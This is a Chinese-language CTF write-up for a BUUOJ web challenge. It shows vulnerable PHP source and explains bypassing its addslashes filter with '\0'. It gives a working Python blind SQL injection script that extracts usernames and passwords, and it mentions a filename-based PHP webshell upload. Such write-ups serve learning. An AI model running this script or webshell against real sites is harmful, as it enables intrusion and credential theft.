---
title: Easyweb
date: 2021-04-02 19:02:57
tags: wp

---
## ' - '     

![](https://ftp.bmp.ovh/imgs/2021/04/ee8f89b00a61ccff.png)    
`robots.txt`    

         
	User-agent: *
	Disallow: *.php.bak        

有`image.php.bak`       



	```php
	<﻿?php
	include "config.php";
	
	$id=isset($_GET["id"])?$_GET["id"]:"1";
	$path=isset($_GET["path"])?$_GET["path"]:"";
	
	$id=addslashes($id);
	$path=addslashes($path);
	
	$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
	$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
	
	$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
	$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
	
	$path="./" . $row["path"];
	header("Content-Type: image/jpeg");
	readfile($path);      
	```     


`addslashes`函数


	返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。      

`image.php?id=1`sql注入     

绕过`id=\0`        

`\0`经过addslashes函数后是`\\0`，然后`\0`替换围殴空格，只剩下了`\`，从而转义`'`         





	```python
	import requests
	import time
	
	url='http://984ea44f-1a99-475f-877c-e0285554e586.node3.buuoj.cn/image.php?id=\\0&path= or '
	flag=''
	st='JFIF'           JFIF是那个图片
	
	for j in range(1,100):
	    s=32
	    l=128
	    mid=(s+l)//2
	    while(s<l):
	        time.sleep(0.1)
	        #payload="ascii(substr(database(),{},1))>{} %23".format(j,mid)
	        #payload="ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{} %23".format(j,mid)
	        #payload="ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{},1))>{} %23".format(j,mid)
	        payload="ascii(substr((select group_concat(username,0x2626,password) from users),{},1))>{} %23".format(j,mid)
	        url_new=url+payload
	        r=requests.get(url=url_new)
	        if st  in r.text:
	            s=mid+1
	        else:
	            l=mid
	        mid=(s+l)//2
	    if(mid==32 or mid==132):
	        break
	    flag=flag+chr(mid)
	    print(flag)
	```     




登录后是传文件，需要在文件名写一句话，用短标签绕过对`php/i`的过滤        
然后出现log路径，但我用蚁剑连不上，？？？        


就这吧，记一次文件名上传一句话木马        

http://t.zoukankan.com/wangtanzhi-p-12253918.html